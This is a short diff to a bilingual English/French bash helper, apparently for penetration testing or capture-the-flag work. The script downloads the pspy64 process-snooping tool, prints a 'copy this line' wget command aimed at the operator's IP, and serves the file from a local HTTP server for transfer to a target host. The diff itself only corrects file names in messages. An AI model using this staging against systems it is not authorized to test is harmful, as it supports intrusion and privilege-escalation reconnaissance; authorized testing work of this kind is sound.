@@ -48,14 +48,14 @@ echo -e "\e[34mTéléchargement de la dernière version de pspy en remplaçant l
 curl -Lf https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o pspy64
 
 # Display the wget command with the IP address of the specified interface in red / Afficher la commande wget avec l'adresse IP de l'interface spécifiée en rouge
-printf "\nCopy this line : \e[31m\e[7m\e[5m\e[1m%*swget http://%s:80/pspy\e[0m\n" $(((${#ip_address} + 12) / 2)) "" "$ip_address"
+printf "\nCopy this line : \e[31m\e[7m\e[5m\e[1m%*swget http://%s:80/pspy64\e[0m\n" $(((${#ip_address} + 12) / 2)) "" "$ip_address"
 echo -e "\n"
 # Launch a local HTTP server to serve linpeas.sh / Lancer un serveur HTTP local pour servir linpeas.sh
 printf "\e[32m\e[1mHTTP server launched on http://%s:80\n ( CTRL+C for STOP )" "$ip_address"
 python3 -m http.server 80
 
 # Remove linpeas.sh file when the user stops the web server / Supprimer le fichier linpeas.sh lorsque l'utilisateur arrête le serveur web
-echo -e "\n\e[34mStopping the web server. Removing pspy64 file... / Arrêt du serveur web. Suppression du fichier linpeas.sh...\e[0m"
+echo -e "\n\e[34mStopping the web server. Removing pspy64 file... / Arrêt du serveur web. Suppression du fichier pspy64...\e[0m"
 echo -e "\e[34mArrêt du serveur web. Suppression du fichier pspy64...\e[0m"
 rm pspy64
 
